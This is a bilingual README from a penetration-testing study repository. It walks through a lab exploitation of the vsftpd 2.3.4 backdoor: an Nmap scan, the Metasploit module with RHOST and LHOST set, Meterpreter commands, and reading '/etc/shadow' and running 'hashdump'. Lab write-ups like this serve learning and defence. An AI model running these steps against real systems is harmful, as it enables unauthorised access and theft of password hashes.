# Red Team Write-ups

This repository contains my studies, notes, and write-ups from penetration testing and Red Team labs.

---

## 📂 Labs

### vsftpd 2.3.4 Exploitation

#### 🎯 Objective
Exploit a known vulnerability in vsftpd 2.3.4 in a controlled lab environment.

#### 🔍 Enumeration
A scan was performed using Nmap:

```bash
nmap -sV <TARGET_IP>
```

Port 21 was found open running an FTP service (vsftpd 2.3.4).

#### 🔎 Vulnerability Research
The service version was researched using searchsploit and CVE databases, revealing a known backdoor vulnerability.

#### 💥 Exploitation
The exploit was executed using Metasploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
set LHOST <YOUR_IP>
exploit
```

#### 🧪 Post-Exploitation
Access to the system was obtained via a Meterpreter session.

Commands executed:

```bash
getuid
sysinfo
ls
shell
whoami
```

#### 🔐 Sensitive Data Access
The following actions were performed:

```bash
cat /etc/shadow
hashdump
```

#### 📚 Conclusion
This lab demonstrates how outdated services can lead to full system compromise.

---

## 🇧🇷 Versão em Português

Este repositório contém meus estudos, anotações e write-ups de laboratórios de testes de invasão e Red Team.

---

## 📂 Laboratórios

### Exploração do vsftpd 2.3.4

#### 🎯 Objetivo
Explorar uma vulnerabilidade conhecida no vsftpd 2.3.4 em um ambiente controlado.

#### 🔍 Enumeração
Foi realizado um scan utilizando o Nmap:

```bash
nmap -sV <IP_DO_ALVO>
```

Foi identificada a porta 21 aberta executando o serviço FTP (vsftpd 2.3.4).

#### 🔎 Pesquisa de Vulnerabilidade
A versão do serviço foi pesquisada utilizando searchsploit e bases de dados de CVEs, revelando uma vulnerabilidade conhecida de backdoor.

#### 💥 Exploração
O exploit foi executado utilizando o Metasploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP_DO_ALVO>
set LHOST <SEU_IP>
exploit
```

#### 🧪 Pós-exploração
Foi obtido acesso ao sistema através de uma sessão Meterpreter.

Comandos executados:

```bash
getuid
sysinfo
ls
shell
whoami
```

#### 🔐 Acesso a Dados Sensíveis
Foram realizadas as seguintes ações:

```bash
cat /etc/shadow
hashdump
```

#### 📚 Conclusão
Este laboratório demonstra como serviços desatualizados podem levar ao comprometimento total de um sistema.
